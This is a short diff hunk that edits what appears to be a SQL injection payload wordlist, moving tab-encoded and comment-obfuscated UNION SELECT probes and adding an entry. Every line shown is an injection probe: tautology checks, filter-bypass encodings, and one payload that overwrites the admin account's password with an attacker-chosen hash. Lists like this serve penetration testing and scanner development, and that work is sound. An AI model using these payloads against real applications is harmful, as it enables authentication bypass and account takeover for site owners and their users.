@@ -173,9 +173,10 @@ last_insert_rowid()>1
 last_insert_rowid()=last_insert_rowid()
 val(cvar(1))=1
 cdbl(1)=cdbl(1)
+1%09and%091=1%09--
+union%09select
+!Body
 'i'='i'
 sha1("3fDf ", true) = ...
 union/*test*/select
-1%09and%091=1%09--
-union%09select
 INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");
